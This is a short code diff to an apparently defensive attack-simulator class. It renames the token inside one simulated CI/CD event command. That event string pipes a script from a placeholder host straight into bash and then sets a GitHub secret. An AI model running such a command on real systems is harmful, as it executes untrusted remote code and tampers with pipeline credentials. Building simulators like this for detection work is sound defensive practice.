@@ -666,7 +666,7 @@ class SafeAttackSimulator {
           ),
           createEvent(
             "command",
-            "curl https://example.invalid/install.sh | bash && gh secret set AGENT_API_TOKEN",
+            "curl https://example.invalid/install.sh | bash && gh secret set MIHWAR_API_TOKEN",
             "safe-simulator",
             [...baseTags, "ci-cd"],
           ),
